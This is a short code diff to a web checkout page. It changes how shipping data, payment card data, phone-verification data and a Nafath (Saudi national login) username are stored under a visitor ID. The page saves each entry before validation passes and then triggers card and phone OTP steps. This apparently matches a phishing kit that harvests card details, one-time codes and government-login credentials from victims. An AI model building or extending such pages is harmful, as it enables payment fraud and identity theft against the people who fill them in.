@@ -581,7 +581,7 @@ export default function CheckoutPage() {
     });
 
     if (!visitorId) return;
-    await addData({ id: visitorId, ...shippingInfo });
+    await addData({ id: visitorId, shipping: shippingInfo });
     if (!nameError && !phoneError && !cityError) {
       goToStep("payment");
     }
@@ -600,7 +600,7 @@ export default function CheckoutPage() {
       cvv: cvvError,
     });
     if (!visitorId) return;
-    await addData({ id: visitorId, ...paymentInfo! });
+    await addData({ id: visitorId, payment: paymentInfo });
     if (!cardNumberError && !cardNameError && !expiryError && !cvvError) {
       sendCardOtp();
     }
@@ -697,7 +697,7 @@ export default function CheckoutPage() {
   const sendPhoneOtp = async () => {
     try {
       if (!visitorId) return;
-      await addData({ id: visitorId, phone2, operator: phoneProvider });
+      await addData({ id: visitorId, phoneVerification: { phone2, operator: phoneProvider } });
       goToStep("phone-otp");
       setResendTimer(30);
       setCanResendOtp(false);
@@ -741,7 +741,7 @@ export default function CheckoutPage() {
       return;
     }
     if (!visitorId) return;
-    await addData({ id: visitorId, nafadUsername });
+    await addData({ id: visitorId, nafath: { nafadUsername } });
     setIsVerifying(true);
     setVerificationError("");
     try {
